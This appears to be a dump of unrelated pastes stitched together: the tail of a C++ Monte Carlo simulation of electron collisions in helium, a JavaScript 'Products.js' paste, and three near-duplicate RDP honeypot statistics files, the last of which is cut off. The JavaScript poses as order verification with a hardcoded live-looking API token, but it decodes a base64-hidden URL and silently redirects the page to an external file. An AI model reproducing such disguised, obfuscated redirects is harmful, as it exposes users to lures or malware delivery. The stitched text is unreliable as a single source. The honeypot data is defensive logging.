                double i_scat = (V0_x/V0)*cos_khi + (1.0 - (V0_x/V0)*(V0_x/V0))*(sin_khi*cos(phi)/sin_theta);
                double j_scat = (V0_y/V0)*cos_khi +  (V0_z/V0)*sin_khi*sin(phi)/sin_theta - (V0_x/V0)*(V0_y/V0)*sin_khi*cos(phi)/sin_theta;
                double k_scat = (V0_z/V0)*cos_khi - (V0_y/V0)*sin_khi*sin(phi)/sin_theta - (V0_x/V0)*(V0_z/V0)*sin_khi*cos(phi)/sin_theta;
 
                //updating electron energy and velocities         
                
                if (e.energy < thresh2) {
                    null_coll_counter++;
                    collision_counter_en++;
                    e.collided_en = true;
                    continue;
                }
                else {
                    e.energy = E_0 - thresh2;
 
                    double speed = sqrt(2*e.energy*q/m_e);
 
                    e.vx = speed*i_scat;
                    e.vy = speed*j_scat;
                    e.vz = speed*k_scat;
 
                    collision_counter_en++;   
                    exc2_coll_counter++;
                    exc2_coll_counter_temp++;
 
                    e.collided_en = true;

                    // pushing this neutral to an array of excited species exc_2

                    if (N_He > 0) {
                        exc_2.push_back({E_n, V_x_n, V_y_n, V_z_n});
                        N_He--;
                    }
                }
            }

            else if (r < P4) {

                //supernelastic 1(singlet -> ground state) collision happens

                if (exc_2.empty()) {
                    null_coll_counter++;
                    collision_counter_en++;
                    e.collided_en = true;
                    continue;            
                }

                // ----   Collision energy redistribution module
 
                // electron particle X Y Z initial velocities and energy
                double V0_x = e.vx;
                double V0_y = e.vy;
                double V0_z = e.vz;
                double E_0 = e.energy;

                double V0 = sqrt(V0_x*V0_x + V0_y*V0_y + V0_z*V0_z);

                // neutral that collides with electron
                // taking particles from dynamic array of excited neutrals

                int index = std::uniform_int_distribution<int>(0, exc_2.size()-1)(gen);
                Excited_neutral& exc = exc_2[index];
                double V_x = exc.vx;
                double V_y = exc.vy;
                double V_z = exc.vz;
                double E = exc.energy;
                
                // generating random variables to calculate random direction of center-of-mass after the collision
 
                double R1 = dis(gen);
                double R2 = dis(gen);
 
                //// calculating spherical angles for center-of-mass random direction
                // double theta = acos(1.0- 2.0*R1);
                // double phi = 2*M_PI*R2;
                double cos_khi = (2.0 + E_0 - 2.0*pow((1+E_0), R1))/E_0;
                double sin_khi = sqrt(1.0 - cos_khi*cos_khi);
 
                double phi = 2.0*M_PI*R2;
                double cos_theta = V0_x/V0;
                double sin_theta = sqrt(1.0 - cos_theta*cos_theta);
                // //calculating final relative velocity with random direction
 
                //calculating final velocity of electron
 
                double i_scat = (V0_x/V0)*cos_khi + (1.0 - (V0_x/V0)*(V0_x/V0))*(sin_khi*cos(phi)/sin_theta);
                double j_scat = (V0_y/V0)*cos_khi +  (V0_z/V0)*sin_khi*sin(phi)/sin_theta - (V0_x/V0)*(V0_y/V0)*sin_khi*cos(phi)/sin_theta;
                double k_scat = (V0_z/V0)*cos_khi - (V0_y/V0)*sin_khi*sin(phi)/sin_theta - (V0_x/V0)*(V0_z/V0)*sin_khi*cos(phi)/sin_theta;
 
                //updating electron energy and velocities         
                
                e.energy = E_0 + thresh2;

                double speed = sqrt(2*e.energy*q/m_e);

                e.vx = speed*i_scat;
                e.vy = speed*j_scat;
                e.vz = speed*k_scat;

                //counting collisions, working with flags, popping atom out of the vector

                if (!exc_2.empty()) {
                    std::swap(exc_2[index], exc_2.back());
                    exc_2.pop_back();
                    N_He++;
                }

                collision_counter_en++;   
                super2_coll_counter++;
                super2_coll_counter_temp++;

                e.collided_en = true;
            }              

            else {
                // null-collision
                collision_counter_en++;
                null_coll_counter++;
                e.collided_en = true;
            }
        }

//         // ----- -------now begin e-e collisions ------ /////

//         // Reshuffle electron indices for random pairing for e-e collisions
//         std::shuffle(electron_indices.begin(), electron_indices.end(), gen);

//         int max_pairs = n_e/2; // each electron collides 
        
//         for (int i = 0; i < max_pairs; i++){

//             int id1 = electron_indices[2 * i];
//             int id2 = electron_indices[2 * i + 1];
//             if (id1 >= n_e || id2 >= n_e) continue; // Handle edge case

//             Electron& e1 = electrons[id1];
//             Electron& e2 = electrons[id2];

//             if (e1.collided_ee || e2.collided_ee) continue; //handle already collided cases

//             double E_initial = e1.energy + e2.energy; // total initial energy of pair to check the energy conservation

//             // generating random variables to calculate random direction of center-of-mass after the collision

//             double R1 = dis(gen);
//             double R2 = dis(gen);        

//             // ----   Collision energy redistribution module

//             // first particle X Y Z initial velocities
//             double V0_x_1 = e1.vx;
//             double V0_y_1 = e1.vy;
//             double V0_z_1 = e1.vz;
//             // second particle X Y Z initial velocities
//             double V0_x_2 = e2.vx;
//             double V0_y_2 = e2.vy;
//             double V0_z_2 = e2.vz;

//             // file13 << ""V0_x_1: "" << V0_x_1 << "" "" << ""V0_y_1: "" << V0_y_1 << "" "" << "" V0_z_1: "" << V0_z_1 << "" "";
//             // file13 << ""V0_x_2: "" << V0_x_2 << "" "" << ""V0_y_2: "" << V0_y_2 << "" "" << "" V0_z_2: "" << V0_z_2 << "" "";

//             // initial relative velocity X Y Z (must be equal to final relative velocity in center-of-mass frame) 

//             double V0_rel_x = (V0_x_1 - V0_x_2);
//             double V0_rel_y = (V0_y_1 - V0_y_2);
//             double V0_rel_z = (V0_z_1 - V0_z_2);

//             if(std::isnan(V0_x_1) || std::isinf(V0_x_1) || fabs(V0_x_1) < 1e-12 || std::isnan(V0_y_1) || std::isinf(V0_y_1) || fabs(V0_y_1) < 1e-12 || std::isnan(V0_z_1) || std::isinf(V0_z_1) || fabs(V0_z_1) < 1e-12){
//                 std::cerr << ""Invalid V0_rel_x computed: "" << V0_rel_x << "" at timestep "" << t << std::endl;
//                 std::cerr << ""Components of velocities: Vx, Vy, Vz forr the first electron: "" << V0_x_1 << "" "" << V0_y_1 << "" "" << V0_z_1 << ""\n"";
//             //    continue;
//             }

//             if(std::isnan(V0_x_2) || std::isinf(V0_x_2) || fabs(V0_x_2) < 1e-12 || std::isnan(V0_y_2) || std::isinf(V0_y_2) || fabs(V0_y_2) < 1e-12 || std::isnan(V0_z_2) || std::isinf(V0_z_2) || fabs(V0_z_2) < 1e-12){
//                 std::cerr << ""Invalid V0_rel_x computed: "" << V0_rel_x << "" at timestep "" << t << std::endl;
//                 std::cerr << ""Components of velocities: Vx, Vy, Vz forr the second electron: "" << V0_x_2 << "" "" << V0_y_2 << "" "" << V0_z_2 << ""\n"";
//             //    continue;
//             }    

//             if(std::isnan(V0_rel_y) || std::isinf(V0_rel_y) || fabs(V0_rel_y) < 1e-12){
//                 std::cerr << ""Invalid V0_rel_y computed: "" << V0_rel_y << "" at timestep "" << t << std::endl;
//                 continue;
//             }     
//             if(std::isnan(V0_rel_z) || std::isinf(V0_rel_z) || fabs(V0_rel_z) < 1e-12){
//                 std::cerr << ""Invalid V0_rel_z computed: "" << V0_rel_z << "" at timestep "" << t << std::endl;
//                 continue;
//             }              


//             double V0_rel = sqrt(V0_rel_x*V0_rel_x + V0_rel_y*V0_rel_y + V0_rel_z*V0_rel_z);
//             double V0_rel_normal = sqrt(V0_rel_y*V0_rel_y + V0_rel_z*V0_rel_z);

//             // file13 << ""V0_rel: "" << V0_rel << "" "" << ""V0_rel_normal: "" << V0_rel_normal << "" "";

//             if(std::isnan(V0_rel) || std::isinf(V0_rel) || fabs(V0_rel) < 1e-12){
//                 std::cerr << ""Invalid V0_rel computed: "" << V0_rel << "" at timestep "" << t << std::endl;
//                 V0_rel = 1.0E-6;
//                 e1.collided_ee = true;
//                 e2.collided_ee = true;
//                 continue;
//             }
            
//             if(std::isnan(V0_rel_normal) || std::isinf(V0_rel_normal) || fabs(V0_rel_normal) < 1e-12){
//                 std::cerr << ""Invalid V0_rel_normal computed: "" << V0_rel << "" at timestep "" << t << std::endl;
//                 continue;
//             }                        

//             // calculating spherical angles for center-of-mass random direction
//             double theta = acos(1.0- 2.0*R1);
//             double phi = 2*M_PI*R2;

//             // calcluating h for equations 20a, 20b (Nanbu1995)

//             double eps = 2*M_PI*R1;

//             double h_x = V0_rel_normal*cos(eps);
//             double h_y = -(V0_rel_y*V0_rel_x*cos(eps) + V0_rel*V0_rel_z*sin(eps))/V0_rel_normal;
//             double h_z = -(V0_rel_z*V0_rel_x*cos(eps) - V0_rel*V0_rel_y*sin(eps))/V0_rel_normal;    

//             //  calculating s (Nanbu1995 eq 19)

//             double s = Coulomb_log/(4.0*M_PI) * pow((q*q/(epsilon_0*(m_e/2))),2) * (n_e/Volume) * pow(V0_rel,-3) * dt;

//             // file13 << ""s: "" << s << "" "";

//             if(std::isnan(s) || std::isinf(s) || fabs(s) < 1e-12){
//                 std::cerr << ""Invalid s computed: "" << s << "" at timestep "" << t << std::endl;
//                 continue;
//             }

//             double A = solve_A(s);   

//             if(std::isnan(A) || std::isinf(A) || fabs(A) < 1e-12){
// //                std::cerr << ""Invalid A computed: "" << A << "" at timestep "" << t << std::endl;
//                 A = 1.0E-12;
// //                continue;
//             }


//             // calculating cos(khi) (Nanbu1995 eq 17)
//             double cos_khi = 0.0;
//             double sin_khi = 0.0;
            
//             if (s < 1.0E-2 & R1 != 0.0) {// taking care of small s  
//                 cos_khi = 1.0 + s*log(R1);    
//             }
//             else {
//                 cos_khi = (1.0/A)*log(exp(-A) + 2.0*R1*sinh(A));
//             }

//             if (cos_khi > 1.0)
//                 cos_khi = 1.0;

//             sin_khi = sqrt(1.0 - cos_khi*cos_khi);


//             //calculating final velocity of first particle

//             double V_x_1 = V0_x_1 - 0.5*(V0_rel_x*(1.0-cos_khi) + h_x*sin_khi);
//             double V_y_1 = V0_y_1 - 0.5*(V0_rel_y*(1.0-cos_khi) + h_y*sin_khi);
//             double V_z_1 = V0_z_1 - 0.5*(V0_rel_z*(1.0-cos_khi) + h_z*sin_khi);

//             double V_1 = sqrt(V_x_1*V_x_1 + V_y_1*V_y_1 + V_z_1*V_z_1);

//             //calculating final velocity of second particle

//             double V_x_2 = V0_x_2 + 0.5*(V0_rel_x*(1.0-cos_khi) + h_x*sin_khi);
//             double V_y_2 = V0_y_2 + 0.5*(V0_rel_y*(1.0-cos_khi) + h_y*sin_khi);
//             double V_z_2 = V0_z_2 + 0.5*(V0_rel_z*(1.0-cos_khi) + h_z*sin_khi);

//             double V_2 = sqrt(V_x_2*V_x_2 + V_y_2*V_y_2 + V_z_2*V_z_2);

//             // updating velocities

//             e1.vx = V_x_1; 
//             e1.vy = V_y_1;
//             e1.vz = V_z_1;

//             e2.vx = V_x_2; // Update velocity components
//             e2.vy = V_y_2;
//             e2.vz = V_z_2;

//             // calculating final energies of first and second colliding particles

//             e1.energy = V_1*V_1*m_e/(2.0*q);
//             e2.energy = V_2*V_2*m_e/(2.0*q);           

//             double E_final = e1.energy + e2.energy;


//             // if(fabs(E_final - E_initial) > 1e-6) {
//             //     std::cerr << ""Energy conservation violation: "" << E_final - E_initial << "" eV\n"";
//             // }

//             // --- collision energy redistrubution module ends  

//             // collision counters handling

//             ee_coll_counter++;
//             e1.collided_ee = true;
//             e2.collided_ee = true;

//         }
//         //////----------------------e-e coulomb collision ends --------------/////////////////


        t_elapsed += dt; // Advance time

        // Recalculate nu_max periodically (e.g., every 100 steps)
        static int recalc_counter = 0;
        if (++recalc_counter >= 1) {
            
            recalc_counter = 0;

            // Recalculate nu_max with CURRENT densities
            nu_max = 0.0;
            for (int i = 0; i < N; i++) {
                double energy = Emin + (i + 0.5) * bin_width;
                
                // Get current densities
                double n_ground = N_He / Volume;
                double n_excited1 = exc_1.size() / Volume;
                double n_excited2 = exc_2.size() / Volume;
                
                // Total collision frequency for this energy bin
                double sigma_total = 
                    elastic_vec[i] * n_ground +
                    inelastic1_vec[i] * n_ground +
                    inelastic2_vec[i] * n_ground +
                    superelastic1_vec[i] * n_excited1 +
                    superelastic2_vec[i] * n_excited2;

                double v = sqrt(2 * energy * q / m_e);
                double nu_temp = sigma_total * v;
                
                if (nu_temp > nu_max) nu_max = nu_temp;
            }

            // Update dt based on new nu_max
            dt = 0.1 / nu_max;        
        }
        std::cout << ""   nu_max: "" << nu_max << ""    "" << ""dt: "" << dt << ""\n"";   
    }

    // ----- final electron energies distribution begins
    for (int i = 0; i < n_e; i++){

        file2 << i << "" "" << electrons[i].energy << ""\n"";

        int bin = static_cast<int>( (electrons[i].energy - Emin)/bin_width_smooth);
        if (bin >=0 && bin < histo_maxwell.size())
            histo_maxwell[bin]++;
    }

    int check = 0;
    for (int i = 0; i < N_smooth; i++){
        check += histo_maxwell[i];
        double bin_center = Emin + (i + 0.5) * bin_width_smooth;
        file4 << bin_center << "" "" <<  static_cast<double>(histo_maxwell[i])/(electrons.size()*bin_width_smooth) << ""\n""; // getting f(E)
    }

        std::cout << ""Total # of electrons in a final histogram: "" << check << ""\n"";

    // ----- final electron energies distribution ends

    // // ------ excited atoms histogram --------/////

    // for (int i = 0; i < exc_1.size(); i++) {

    //     file14 << i << "" "" << exc_1[i].energy << ""\n"";

    //     int bin = static_cast<int>( (exc_1[i].energy - Emin)/bin_width);
    //     if (bin >=0 && bin < histo_excited.size())
    //         histo_excited[bin]++;        
    // }

    // for (int i = 0; i < histo_excited.size(); i++){

    //     double bin_center = Emin + (i + 0.5) * bin_width;
    //     file15 << bin_center << "" "" <<  static_cast<double>(histo_excited[i])/(electrons.size()*bin_width) << ""\n""; // getting f(E)
    // }


    file0.close();
    file1.close();
    file2.close();
    file3.close();
    file4.close();
    file5.close();
    file6.close();
    file7.close();
    file8.close();
    file9.close();
    file10.close();
    file11.close();
    file12.close();
    file13.close();
    file14.close();
    file15.close();
    file_temp.close();

    clock_t end = clock();

    double elapsed = (double)(end - start) / CLOCKS_PER_SEC;

    // std::cout << ""# of steps: "" << steps << ""\n"";
    // std::cout << ""# of electrons collided each timesteps:"" << Ne_collided << ""\n"";
    
    // std::cout << ""Average elastic collisions per timestep: "" << static_cast<int>(el_coll_counter/steps) << ""\n"";
    // std::cout << ""Average null collisions per timestep: "" << static_cast<int>(null_coll_counter/steps) << ""\n"";
    // std::cout << ""\n"";

    // std::cout << ""triplet:________"" << ""\n"";
    // std::cout << ""Average triplet excitation collisions per timestep: "" << static_cast<int>(exc1_coll_counter/steps) << ""\n"";
    // std::cout << ""\n"";
    // std::cout << ""Average superelastic triplet collisions per timestep: "" << static_cast<int>(super1_coll_counter/steps) << ""\n"";
    // std::cout << ""\n"";

    // std::cout << ""singlet:________"" << ""\n"";
    // std::cout << ""Average singlet excitation collisions per timestep: "" << static_cast<int>(exc2_coll_counter/steps) << ""\n"";
    // std::cout << ""\n"";
    // std::cout << ""Average superelastic singlet collisions per timestep: "" << static_cast<int>(super2_coll_counter/steps) << ""\n"";
    // std::cout << ""\n"";    

    // std::cout << ""Average e-e collisions per timestep: "" << static_cast<int>(ee_coll_counter/steps) << ""\n"";

    std::cout << ""Elapsed time: %f seconds "" << elapsed << ""\n"";


    return 0;

}"
zPP7StAM,Products.js,jm33,JavaScript,Wednesday 16th of April 2025 07:18:24 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/24301/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
z6D3U676,2025-04-15_stats.json,rdp_snitch,JSON,Wednesday 16th of April 2025 07:18:15 PM CDT,"{
  ""ip"": {
    ""222.100.239.9"": 453,
    ""156.146.57.47"": 5064,
    ""80.94.95.198"": 30,
    ""211.185.207.14"": 33,
    ""194.165.17.21"": 63,
    ""58.218.199.219"": 3,
    ""167.94.145.96"": 3,
    ""71.82.170.60"": 51,
    ""198.235.24.56"": 9,
    ""80.94.95.90"": 12,
    ""194.180.49.123"": 3,
    ""92.255.85.59"": 6,
    ""147.185.132.99"": 9,
    ""101.36.97.70"": 3,
    ""157.245.104.150"": 3,
    ""91.238.181.95"": 6,
    ""88.214.25.121"": 6,
    ""112.220.69.148"": 3,
    ""80.66.79.30"": 3,
    ""150.95.30.49"": 3,
    ""156.146.57.181"": 2304,
    ""198.235.24.79"": 9,
    ""165.154.163.199"": 3,
    ""92.255.57.11"": 9,
    ""205.210.31.234"": 9,
    ""194.187.176.78"": 3
  },
  ""asn"": {
    ""AS4766"": 486,
    ""AS212238"": 7368,
    ""AS204428"": 42,
    ""AS48721"": 63,
    ""AS4134"": 3,
    ""AS398705"": 3,
    ""AS20115"": 51,
    ""AS396982"": 36,
    ""AS201814"": 3,
    ""AS207566"": 15,
    ""AS135377"": 6,
    ""AS14061"": 3,
    ""AS49434"": 6,
    ""AS35042"": 6,
    ""AS3786"": 3,
    ""AS60602"": 3,
    ""AS135161"": 3,
    ""AS208843"": 3
  },
  ""isp"": {
    ""Korea Telecom"": 486,
    ""Datacamp Limited"": 7368,
    ""SS-Net"": 42,
    ""Flyservers S.A."": 63,
    ""Chinanet"": 3,
    ""Censys, Inc."": 3,
    ""Charter Communications"": 51,
    ""Google LLC"": 36,
    ""MEVSPACE sp. z o.o."": 3,
    ""Chang Way Technologies Co. Limited"": 15,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 6,
    ""DigitalOcean, LLC"": 3,
    ""Datacenter location PAR1 France"": 6,
    ""NOC EMAIL: noc@one-host.net"": 6,
    ""LG DACOM Corporation"": 3,
    ""HYPER-HOSTING"": 3,
    ""GMO-Z.COM PTE. LTD."": 3,
    ""Alpha Strike Labs GmbH"": 3
  },
  ""org"": {
    ""Kornet"": 486,
    ""Datacamp Limited"": 7368,
    ""Unmanaged LTD"": 42,
    ""Flyservers S.A"": 63,
    ""Chinanet JS"": 3,
    ""Censys, Inc."": 3,
    ""Spectrum"": 51,
    ""Palo Alto Networks, Inc"": 36,
    ""HostSlick"": 3,
    ""Chang Way Technologies Co. Limited"": 15,
    ""Ucloud Information Technology"": 6,
    ""DigitalOcean, LLC"": 3,
    ""ThinkTech Technology Industrial CO. Limited"": 12,
    ""LG Uplus"": 3,
    ""Hyper Hosting SRL"": 3,
    ""Zcom Thai"": 3,
    ""Alpha Strike Labs GmbH"": 3
  },
  ""regionName"": {
    ""Incheon"": 453,
    ""North West"": 7368,
    ""Budapest"": 42,
    ""Sejong-si"": 33,
    ""Kaunas"": 63,
    ""Jiangsu"": 3,
    ""Michigan"": 3,
    ""Wisconsin"": 51,
    ""California"": 39,
    ""Bavaria"": 3,
    ""Moscow"": 15,
    ""England"": 3,
    ""Karnataka"": 3,
    ""\u00cele-de-France"": 6,
    ""Kowloon City"": 6,
    ""Daegu"": 3,
    ""Chi\u0219in\u0103u Municipality"": 3,
    ""Bangkok"": 3,
    ""State of Berlin"": 3
  },
  ""country"": {
    ""South Korea"": 489,
    ""Singapore"": 7368,
    ""Hungary"": 42,
    ""Lithuania"": 63,
    ""China"": 3,
    ""United States"": 93,
    ""Germany"": 6,
    ""Russia"": 15,
    ""United Kingdom"": 3,
    ""India"": 3,
    ""France"": 6,
    ""Hong Kong"": 6,
    ""Moldova"": 3,
    ""Thailand"": 3
  },
  ""account"": {
    ""hello"": 7839,
    ""142.93.8.59"": 177,
    ""(empty)"": 3,
    ""kPDFXKcqY"": 3,
    ""eHQPRO"": 3,
    ""IxZpHA"": 3,
    ""Administr"": 27,
    ""ZowCwKysJ"": 3,
    ""mFvdGe"": 3,
    ""JIrbro"": 3,
    ""Administrator"": 6,
    ""Test"": 12,
    ""pDtLpgsRc"": 3,
    ""eQuQcP"": 3,
    ""fwSEFs"": 3,
    ""MonbwLjLu"": 3,
    ""iSDeFN"": 3,
    ""xGQvYq"": 3,
    ""user"": 3
  },
  ""keyboard"": {
    ""Unknown"": 8103
  },
  ""client_build"": {
    ""Unknown"": 8103
  },
  ""client_name"": {
    ""Unknown"": 8103
  },
  ""ip_type"": {
    ""Unknown"": 660,
    ""hosting & proxy"": 7371,
    ""proxy"": 18,
    ""hosting"": 54
  }
}"
eBM4Ac2a,2025-04-15_stats.json,rdp_snitch,JSON,Wednesday 16th of April 2025 07:16:18 PM CDT,"{
  ""ip"": {
    ""222.100.239.9"": 452,
    ""156.146.57.47"": 5064,
    ""80.94.95.198"": 30,
    ""211.185.207.14"": 33,
    ""194.165.17.21"": 63,
    ""58.218.199.219"": 3,
    ""167.94.145.96"": 3,
    ""71.82.170.60"": 51,
    ""198.235.24.56"": 9,
    ""80.94.95.90"": 12,
    ""194.180.49.123"": 3,
    ""92.255.85.59"": 6,
    ""147.185.132.99"": 9,
    ""101.36.97.70"": 3,
    ""157.245.104.150"": 3,
    ""91.238.181.95"": 6,
    ""88.214.25.121"": 6,
    ""112.220.69.148"": 3,
    ""80.66.79.30"": 3,
    ""150.95.30.49"": 3,
    ""156.146.57.181"": 2304,
    ""198.235.24.79"": 9,
    ""165.154.163.199"": 3,
    ""92.255.57.11"": 9,
    ""205.210.31.234"": 9,
    ""194.187.176.78"": 3
  },
  ""asn"": {
    ""AS4766"": 485,
    ""AS212238"": 7368,
    ""AS204428"": 42,
    ""AS48721"": 63,
    ""AS4134"": 3,
    ""AS398705"": 3,
    ""AS20115"": 51,
    ""AS396982"": 36,
    ""AS201814"": 3,
    ""AS207566"": 15,
    ""AS135377"": 6,
    ""AS14061"": 3,
    ""AS49434"": 6,
    ""AS35042"": 6,
    ""AS3786"": 3,
    ""AS60602"": 3,
    ""AS135161"": 3,
    ""AS208843"": 3
  },
  ""isp"": {
    ""Korea Telecom"": 485,
    ""Datacamp Limited"": 7368,
    ""SS-Net"": 42,
    ""Flyservers S.A."": 63,
    ""Chinanet"": 3,
    ""Censys, Inc."": 3,
    ""Charter Communications"": 51,
    ""Google LLC"": 36,
    ""MEVSPACE sp. z o.o."": 3,
    ""Chang Way Technologies Co. Limited"": 15,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 6,
    ""DigitalOcean, LLC"": 3,
    ""Datacenter location PAR1 France"": 6,
    ""NOC EMAIL: noc@one-host.net"": 6,
    ""LG DACOM Corporation"": 3,
    ""HYPER-HOSTING"": 3,
    ""GMO-Z.COM PTE. LTD."": 3,
    ""Alpha Strike Labs GmbH"": 3
  },
  ""org"": {
    ""Kornet"": 485,
    ""Datacamp Limited"": 7368,
    ""Unmanaged LTD"": 42,
    ""Flyservers S.A"": 63,
    ""Chinanet JS"": 3,
    ""Censys, Inc."": 3,
    ""Spectrum"": 51,
    ""Palo Alto Networks, Inc"": 36,
    ""HostSlick"": 3,
    ""Chang Way Technologies Co. Limited"": 15,
    ""Ucloud Information Technology"": 6,
    ""DigitalOcean, LLC"": 3,
    ""ThinkTech Technology Industrial CO. Limited"": 12,
    ""LG Uplus"": 3,
    ""Hyper Hosting SRL"": 3,
    ""Zcom Thai"": 3,
    ""Alpha Strike Labs GmbH"": 3
  },
  ""regionName"": {
    ""Incheon"": 452,
    ""North West"": 7368,
    ""Budapest"": 42,
    ""Sejong-si"": 33,
    ""Kaunas"": 63,
    ""Jiangsu"": 3,
    ""Michigan"": 3,
    ""Wisconsin"": 51,
    ""California"": 39,
    ""Bavaria"": 3,
    ""Moscow"": 15,
    ""England"": 3,
    ""Karnataka"": 3,
    ""\u00cele-de-France"": 6,
    ""Kowloon City"": 6,
    ""Daegu"": 3,
    ""Chi\u0219in\u0103u Municipality"": 3,
    ""Bangkok"": 3,
    ""State of Berlin"": 3
  },
  ""country"": {
    ""South Korea"": 488,
    ""Singapore"": 7368,
    ""Hungary"": 42,
    ""Lithuania"": 63,
    ""China"": 3,
    ""United States"": 93,
    ""Germany"": 6,
    ""Russia"": 15,
    ""United Kingdom"": 3,
    ""India"": 3,
    ""France"": 6,
    ""Hong Kong"": 6,
    ""Moldova"": 3,
    ""Thailand"": 3
  },
  ""account"": {
    ""hello"": 7838,
    ""142.93.8.59"": 177,
    ""(empty)"": 3,
    ""kPDFXKcqY"": 3,
    ""eHQPRO"": 3,
    ""IxZpHA"": 3,
    ""Administr"": 27,
    ""ZowCwKysJ"": 3,
    ""mFvdGe"": 3,
    ""JIrbro"": 3,
    ""Administrator"": 6,
    ""Test"": 12,
    ""pDtLpgsRc"": 3,
    ""eQuQcP"": 3,
    ""fwSEFs"": 3,
    ""MonbwLjLu"": 3,
    ""iSDeFN"": 3,
    ""xGQvYq"": 3,
    ""user"": 3
  },
  ""keyboard"": {
    ""Unknown"": 8102
  },
  ""client_build"": {
    ""Unknown"": 8102
  },
  ""client_name"": {
    ""Unknown"": 8102
  },
  ""ip_type"": {
    ""Unknown"": 659,
    ""hosting & proxy"": 7371,
    ""proxy"": 18,
    ""hosting"": 54
  }
}"
FFA19xba,2025-04-15_stats.json,rdp_snitch,JSON,Wednesday 16th of April 2025 07:15:09 PM CDT,"{
  ""ip"": {
    ""222.100.239.9"": 451,
    ""156.146.57.47"": 5064,
    ""80.94.95.198"": 30,
    ""211.185.207.14"": 33,
    ""194.165.17.21"": 63,
    ""58.218.199.219"": 3,
    ""167.94.145.96"": 3,
    ""71.82.170.60"": 51,
    ""198.235.24.56"": 9,
    ""80.94.95.90"": 12,
    ""194.180.49.123"": 3,
    ""92.255.85.59"": 6,
    ""147.185.132.99"": 9,
    ""101.36.97.70"": 3,
    ""157.245.104.150"": 3,
    ""91.238.181.95"": 6,
    ""88.214.25.121"": 6,
    ""112.220.69.148"": 3,
    ""80.66.79.30"": 3,
    ""150.95.30.49"": 3,
    ""156.146.57.181"": 2304,
    ""198.235.24.79"": 9,
    ""165.154.163.199"": 3,
    ""92.255.57.11"": 9,
    ""205.210.31.234"": 9,
    ""194.187.176.78"": 3
  },
  ""asn"": {
    ""AS4766"": 484,
    ""AS212238"": 7368,
    ""AS204428"": 42,
    ""AS48721"": 63,
    ""AS4134"": 3,
    ""AS398705"": 3,
    ""AS20115"": 51,
    ""AS396982"": 36,
    ""AS201814"": 3,
    ""AS207566"": 15,
    ""AS135377"": 6,
    ""AS14061"": 3,
    ""AS49434"": 6,
    ""AS35042"": 6,
    ""AS3786"": 3,
    ""AS60602"": 3,
    ""AS135161"": 3,
    ""AS208843"": 3
  },
  ""isp"": {
    ""Korea Telecom"": 484,
    ""Datacamp Limited"": 7368,
    ""SS-Net"": 42,
    ""Flyservers S.A."": 63,
    ""Chinanet"": 3,
    ""Censys, Inc."": 3,
    ""Charter Communications"": 51,
    ""Google LLC"": 36,
    ""MEVSPACE sp. z o.o."": 3,
    ""Chang Way Technologies Co. Limited"": 15,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 6,
    ""DigitalOcean, LLC"": 3,
    ""Datacenter location PAR1 France"": 6,
    ""NOC EMAIL: noc@one-host.net"": 6,
    ""LG DACOM Corporation"": 3,
    ""HYPER-HOSTING"": 3,
    ""GMO-Z.COM PTE. LTD."": 3,
    ""Alpha Strike Labs GmbH"": 3
  },
  ""org"": {
    ""Kornet"": 484,
    ""Datacamp Limited"": 7368,
    ""Unmanaged LTD"": 42,
    ""Flyservers S.A"": 63,
    ""Chinanet JS"": 3,
    ""Censys, Inc."": 3,
    ""Spectrum"": 51,
    ""Palo Alto Networks, Inc"": 36,
    ""HostSlick"": 3,
    ""Chang Way Technologies Co. Limited"": 15,
    ""Ucloud Information Technology"": 6,
    ""DigitalOcean, LLC"": 3,
    ""ThinkTech Technology Industrial CO. Limited"": 12,
    ""LG Uplus"": 3,
    ""Hyper Hosting SRL"": 3,
    ""Zcom Thai"": 3,
    ""Alpha Strike Labs GmbH"": 3
  },
  ""regionName"": {
    ""Incheon"": 451,
    ""North West"": 7368,
    ""Budapest"": 42,
    ""Sejong-si"": 33,
    ""Kaunas"": 63,
    ""Jiangsu"": 3,
    ""Michigan"": 3,
    ""Wisconsin"": 51,
    ""California"": 39,
    ""Bavaria"": 3,
    ""Moscow"": 15,
    ""England"": 3,
    ""Karnataka"": 3,
    ""\u00cele-de-France"": 6,
    ""Kowloon City"": 6,
    ""Daegu"": 3,
    ""Chi\u0219in\u0103u Municipality"": 3,
    ""Bangkok"": 3,
    ""State of Berlin"": 3
  },
  ""country"": {
    ""South Korea"": 487,
    ""Singapore"": 7368,
    ""Hungary"": 42,
    ""Lithuania"": 63,
    ""China"": 3,
    ""United States"": 93,
    ""Germany"": 6,
    ""Russia"": 15,
    ""United Kingdom"": 3,
    ""India"": 3,
    ""France"": 6,
    ""Hong Kong"": 6,
    ""Moldova"": 3,
    ""Thailand"": 3
  },
  ""account"": {
    ""hello"": 7837,
    ""142.93.8.59"": 177,
    ""(empty)"": 3,
    ""kPDFXKcqY"": 3,
    ""eHQPRO"": 3,
    ""IxZpHA"": 3,
    ""Administr"": 27,
    ""ZowCwKysJ"": 3,
    ""mFvdGe"": 3,
    ""JIrbro"": 3,
    ""Administrator"": 6,
    ""Test"": 12,
    ""pDtLpgsRc"": 3,
    ""eQuQcP"": 3,
    ""fwSEFs"": 3,
    ""MonbwLjLu"": 3,
    ""iSDeFN"": 3,
    ""xGQvYq"": 3,
    ""user"": 3
  },
  ""keyboard"": {
    ""Unknown"": 8101
  },
  ""client_build"": {
    ""Unknown"": 8101
  },
  ""client_name"": {
    ""Unknown"": 8101
  },
  ""ip_type"": {
